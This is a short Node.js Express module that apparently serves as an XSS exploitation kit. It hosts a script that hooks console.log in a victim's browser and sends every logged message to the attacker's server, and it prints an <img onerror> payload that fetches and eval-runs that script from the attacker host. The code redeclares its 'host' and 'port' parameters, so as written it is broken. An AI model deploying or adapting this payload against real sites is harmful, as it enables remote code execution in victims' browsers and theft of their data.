const express = require('express')
const cors = require('cors')

function startConsoleCatcher(host, port) {
    const app = express()

    app.use(cors())
    app.use(express.json());
    app.use(express.urlencoded({ extended: true }));


    const host = process.argv[2]
    const port = parseInt(process.argv[3])

    const shell = `(() => {
        const log = console.log;
        console.log = (...args) => {
            fetch('http://${host}:${port}/log', {
                method: "POST",
                body: JSON.stringify({res: args.join(' ')}),
                headers: {
                    'Content-Type': 'application/json'
                }
            });
            log(...args);
        }
    })()
    `

    const injection_img = `<img src=x onerror="fetch('http://${host}:${port}/shell').then(t=>t.text()).then(c=>eval(c))" />`

    app.get('/shell', function (req, res) {
        res.send(shell)
    })

    app.post('/log', function (req, res) {
        console.log(req.body.res)
        res.send('')
    })

    app.listen(port, () => {
        console.log(`IMG Injection: ${injection_img}`)
    });
}

module.exports = {
    startConsoleCatcher
}
